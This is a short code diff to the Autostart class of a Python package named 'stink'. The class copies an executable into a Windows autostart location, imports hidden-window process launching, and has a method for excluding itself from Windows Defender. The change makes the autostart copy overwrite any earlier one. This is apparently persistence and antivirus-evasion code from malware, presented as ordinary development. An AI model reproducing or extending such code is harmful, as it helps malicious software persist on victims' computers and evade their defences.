@@ -1,6 +1,6 @@
-from os import path
-from shutil import copyfile
 from ctypes import windll
+from os import path, remove
+from shutil import copyfile
 from subprocess import Popen, CREATE_NEW_CONSOLE, SW_HIDE
 
 from stink.helpers.config import AutostartConfig
@@ -26,7 +26,10 @@ class Autostart:
         Returns:
         - None.
         """
-        copyfile(self.__executor_path, self.__autostart_path)
+        if path.exists(self.__autostart_path):
+            remove(self.__autostart_path)
+
+        copyfile(self.__executor_path, self.__autostart_path, )
 
     def __exclude_from_defender(self) -> None:
         """
